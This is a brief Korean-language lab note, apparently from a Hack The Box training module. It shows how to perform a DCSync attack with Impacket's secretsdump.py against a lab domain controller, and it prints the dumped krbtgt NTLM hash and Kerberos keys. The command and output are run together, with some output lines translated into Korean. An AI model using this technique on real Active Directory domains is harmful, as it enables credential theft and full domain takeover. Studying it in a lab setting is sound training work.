# Secretdump.py로 DCsync 수행하기

`secretsdump.py를` 사용하여 DCSync를 실행하고 KRBTGT 계정에 대한 NTLM 해시를 가져올 수 있습니다.

```bash
realblackcat@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgtImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation 비밀번호: [*] 도메인 자격증명 덤프 (domain\uid:rid:lmhash:nthash) [*] DRSUAPI 방법을 사용하여 NTDS 가져오기.DIT 시크릿 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f::: [*] Kerberos 키 가져온 krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
krbtgt:des-cbc-md5:fee04c3d026d7538
[*] Cleaning up...
```
